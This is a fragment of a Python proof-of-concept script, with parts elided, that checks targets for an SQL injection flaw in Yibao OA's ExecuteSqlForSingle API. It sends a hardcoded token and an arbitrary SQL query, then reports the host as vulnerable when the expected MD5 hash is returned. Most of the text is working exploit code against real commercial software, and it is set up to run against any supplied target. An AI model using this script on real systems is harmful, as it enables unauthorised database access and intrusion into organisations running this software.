...
import argparse,sys,json,requests,random
...
def poc(target):
    ...
    payload = '/api/system/ExecuteSqlForSingle'
    ...
    data = "token=zxh&sql=select substring(sys.fn_sqlvarbasetostr(HashBytes('MD5','1')),3,32)&strParameters"
    try:
        res1 = requests.get(url=target,headers=headers,timeout=5,verify=False)
        if res1.status_code == 200:
            res2 = requests.post(url=target+payload,headers=headers1,data=data,timeout=5,verify=False)
            res2_content = json.loads(res2.text)
            if "c4ca4238a0b923820dcc509a6f75849b" == res2_content["data"]:
                print(f"[+]{target}存在漏洞")
...
def main():
    # 定义
    parse = argparse.ArgumentParser(description="易宝OA ExecuteSqlForSingle SQL注入漏洞")
